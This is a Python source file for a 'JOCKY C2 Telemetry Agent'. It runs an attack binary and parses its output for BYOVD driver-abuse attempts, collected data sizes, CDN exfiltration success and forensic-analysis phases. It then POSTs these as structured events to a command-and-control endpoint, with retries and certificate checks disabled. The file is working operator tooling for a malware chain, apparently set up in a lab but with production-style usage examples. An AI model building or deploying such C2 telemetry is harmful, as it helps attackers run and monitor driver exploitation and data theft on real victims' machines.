#!/usr/bin/env python3
"""
JOCKY C2 Telemetry Agent

Runs a JOCKY binary as a subprocess, captures output in real-time, parses phase
completion and activity messages, and sends structured telemetry events to a C2
backend via HTTP POST.

Events captured:
- Phase starts/completions
- BYOVD driver attempts (pending/success/failure)
- Data collection events
- Exfiltration status
- Forensic analysis results
"""

import subprocess
import re
import json
import time
import threading
import logging
from datetime import datetime
from typing import Optional, Dict, Any, List
from collections import deque
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None


class TelemetryAgent:
    """
    Telemetry agent for JOCKY C2 binary execution.

    Runs a binary as a subprocess, parses telemetry from stdout/stderr,
    batches events, and sends to C2 backend with retry logic.
    """

    # Regex patterns for event parsing
    PHASE_START_PATTERN = re.compile(r"\[\*\]\s+Phase\s+(\d+):", re.IGNORECASE)
    BYOVD_DRIVER_TRY_PATTERN = re.compile(r"\[BYOVD\]\s+Trying\s+driver:\s+(\S+)", re.IGNORECASE)
    BYOVD_DEVICE_OK_PATTERN = re.compile(r"\[BYOVD\]\s+Device\s+handle:\s+OK", re.IGNORECASE)
    BYOVD_DEVICE_FAILED_PATTERN = re.compile(r"\[BYOVD\]\s+Device\s+open\s+FAILED\s+\(err=(\d+)\)", re.IGNORECASE)
    DATA_COLLECTION_PATTERN = re.compile(r"\[\+\]\s+Data\s+Collection:\s+(\d+)\s+bytes", re.IGNORECASE)
    CDN_EXFIL_PATTERN = re.compile(r"\[\+\]\s+CDN\s+exfiltration\s+successful", re.IGNORECASE)
    FORENSIC_COMPLETE_PATTERN = re.compile(r"\[\+\]\s+Forensic\s+analysis\s+phase\s+complete", re.IGNORECASE)

    def __init__(
        self,
        binary_path: str,
        c2_url: str = "http://192.168.56.1:8443/api/telemetry/report",
        chain_id: str = "research_chain_v4",
        batch_interval: float = 10.0,
        max_retries: int = 3,
        log_file: Optional[str] = None,
    ):
        """
        Initialize telemetry agent.

        Args:
            binary_path: Path to JOCKY binary to run
            c2_url: C2 backend telemetry endpoint
            chain_id: Chain identifier for this telemetry session
            batch_interval: Max seconds before batching and sending events
            max_retries: Max retries for failed HTTP POSTs
            log_file: Optional log file path (logs to console if None)
        """
        self.binary_path = binary_path
        self.c2_url = c2_url
        self.chain_id = chain_id
        self.batch_interval = batch_interval
        self.max_retries = max_retries

        self.events: deque = deque()
        self.running = False
        self.process = None
        self.last_phase = None
        self.last_driver_name = None
        self.lock = threading.Lock()

        # Setup logging
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        handler = logging.FileHandler(log_file) if log_file else logging.StreamHandler()
        formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
        handler.setFormatter(formatter)
        if not self.logger.handlers:
            self.logger.addHandler(handler)

    def parse_line(self, line: str) -> Optional[Dict[str, Any]]:
        """
        Parse a line from binary output into a telemetry event.

        Returns None if line doesn't match any pattern.
        """
        timestamp = datetime.utcnow().isoformat() + "Z"

        # Phase start
        match = self.PHASE_START_PATTERN.search(line)
        if match:
            phase_num = int(match.group(1))
            self.last_phase = phase_num
            return {
                "timestamp": timestamp,
                "chain_id": self.chain_id,
                "event_type": "phase_start",
                "phase": phase_num,
                "status": "pending",
                "details": {"raw": line},
            }

        # BYOVD driver attempt - trying
        match = self.BYOVD_DRIVER_TRY_PATTERN.search(line)
        if match:
            driver_name = match.group(1)
            self.last_driver_name = driver_name
            return {
                "timestamp": timestamp,
                "chain_id": self.chain_id,
                "event_type": "driver_attempt",
                "phase": self.last_phase or 0,
                "status": "pending",
                "details": {"driver": driver_name, "action": "attempting"},
            }

        # BYOVD device handle success
        match = self.BYOVD_DEVICE_OK_PATTERN.search(line)
        if match:
            return {
                "timestamp": timestamp,
                "chain_id": self.chain_id,
                "event_type": "driver_attempt",
                "phase": self.last_phase or 0,
                "status": "success",
                "details": {
                    "driver": self.last_driver_name or "unknown",
                    "action": "device_open",
                },
            }

        # BYOVD device open failed
        match = self.BYOVD_DEVICE_FAILED_PATTERN.search(line)
        if match:
            error_code = int(match.group(1))
            return {
                "timestamp": timestamp,
                "chain_id": self.chain_id,
                "event_type": "driver_attempt",
                "phase": self.last_phase or 0,
                "status": "failure",
                "details": {
                    "driver": self.last_driver_name or "unknown",
                    "action": "device_open",
                    "error_code": error_code,
                },
            }

        # Data collection
        match = self.DATA_COLLECTION_PATTERN.search(line)
        if match:
            bytes_collected = int(match.group(1))
            return {
                "timestamp": timestamp,
                "chain_id": self.chain_id,
                "event_type": "data_collected",
                "phase": self.last_phase or 0,
                "status": "success",
                "details": {"bytes": bytes_collected},
            }

        # CDN exfiltration
        match = self.CDN_EXFIL_PATTERN.search(line)
        if match:
            return {
                "timestamp": timestamp,
                "chain_id": self.chain_id,
                "event_type": "exfil_sent",
                "phase": self.last_phase or 0,
                "status": "success",
                "details": {"channel": "cdn"},
            }

        # Forensic analysis complete
        match = self.FORENSIC_COMPLETE_PATTERN.search(line)
        if match:
            return {
                "timestamp": timestamp,
                "chain_id": self.chain_id,
                "event_type": "phase_complete",
                "phase": self.last_phase or 0,
                "status": "success",
                "details": {"type": "forensic_analysis"},
            }

        return None

    def add_event(self, event: Dict[str, Any]) -> None:
        """Add an event to the batch queue."""
        with self.lock:
            self.events.append(event)
        self.logger.debug(f"Event queued: {event['event_type']} - {event['status']}")

    def send_batch(self, events: List[Dict[str, Any]]) -> bool:
        """
        Send events to C2 backend with retry logic.
        Sends each event individually to match backend API format.

        Returns True if all events sent successfully, False if any failed.
        """
        if not events:
            return True

        if requests is None:
            self.logger.warning("requests module not available, logging events locally only")
            for event in events:
                self.logger.info(f"Event (local): {json.dumps(event)}")
            return True

        # Send each event individually
        all_success = True
        for event in events:
            for attempt in range(self.max_retries):
                try:
                    response = requests.post(
                        self.c2_url,
                        json=event,  # Send event directly, not wrapped
                        timeout=5,
                        verify=False,  # Allow self-signed certs
                    )
                    if response.status_code in (200, 201, 202):
                        self.logger.info(
                            f"Sent event: {event.get('event_type')} (status={response.status_code})"
                        )
                        break  # Move to next event
                    else:
                        self.logger.warning(
                            f"Event send failed (status={response.status_code}): {response.text[:200]}"
                        )
                except Exception as e:
                    self.logger.warning(f"Attempt {attempt + 1}/{self.max_retries}: {e}")
                    if attempt < self.max_retries - 1:
                        time.sleep(2 ** attempt)  # Exponential backoff
                        continue
                    all_success = False
                    break
            else:
                # All retries exhausted for this event
                all_success = False

        return all_success

    def batch_and_send_worker(self) -> None:
        """
        Background worker thread that periodically batches and sends events.
        Runs until self.running is False.
        """
        while self.running:
            time.sleep(self.batch_interval)
            batch = None
            with self.lock:
                if self.events:
                    batch = list(self.events)
                    self.events.clear()

            if batch:
                self.send_batch(batch)

    def run(self, binary_args: Optional[List[str]] = None) -> int:
        """
        Run the JOCKY binary and collect telemetry.

        Args:
            binary_args: Additional arguments to pass to the binary

        Returns:
            Exit code of the binary process
        """
        self.running = True
        self.logger.info(f"Starting JOCKY binary: {self.binary_path}")

        # Start background batch/send worker
        sender_thread = threading.Thread(target=self.batch_and_send_worker, daemon=True)
        sender_thread.start()

        try:
            # Start subprocess
            cmd = [self.binary_path] + (binary_args or [])
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,  # Line buffered
            )

            # Read output line by line
            self.logger.info("Reading subprocess output...")
            for line in self.process.stdout:
                line = line.rstrip("\n\r")
                self.logger.debug(f"[subprocess] {line}")

                # Try to parse as event
                event = self.parse_line(line)
                if event:
                    self.add_event(event)

            # Wait for process to finish
            self.process.wait()
            exit_code = self.process.returncode

            # Flush any remaining events
            self.logger.info("Flushing remaining events...")
            time.sleep(0.5)  # Small delay to let events queue
            with self.lock:
                if self.events:
                    batch = list(self.events)
                    self.events.clear()
                else:
                    batch = []
            if batch:
                self.send_batch(batch)

            self.logger.info(f"Binary exited with code {exit_code}")
            return exit_code

        except FileNotFoundError:
            self.logger.error(f"Binary not found: {self.binary_path}")
            return 127
        except Exception as e:
            self.logger.error(f"Error running binary: {e}")
            return 1
        finally:
            self.running = False
            sender_thread.join(timeout=2)


def main():
    """Usage example and testing."""
    import sys

    # Setup logging for example
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    # Example 1: Run a dummy binary (for testing)
    if len(sys.argv) > 1:
        binary_path = sys.argv[1]
        agent = TelemetryAgent(
            binary_path=binary_path,
            c2_url="http://192.168.56.1:8443/api/telemetry/report",
            chain_id="research_chain_v4",
            batch_interval=10.0,
        )
        exit_code = agent.run()
        sys.exit(exit_code)

    # Example 2: Test with a simple shell script that produces output
    print("TelemetryAgent Example Usage:")
    print()
    print("  # Run against a real JOCKY binary:")
    print("  python3 telemetry_agent.py ./jocky_binary")
    print()
    print("  # Run with arguments:")
    print("  agent = TelemetryAgent('./jocky_binary', chain_id='prod_chain_v1')")
    print("  exit_code = agent.run(['--aggressive', '--forensic'])")
    print()
    print("Example telemetry events that will be parsed and sent:")
    print("  [*] Phase 1: Starting BYOVD exploitation")
    print("  [BYOVD] Trying driver: storage_adapter.sys")
    print("  [BYOVD] Device handle: OK")
    print("  [+] Data Collection: 576 bytes")
    print("  [+] CDN exfiltration successful")
    print("  [+] Forensic analysis phase complete")


if __name__ == "__main__":
    main()
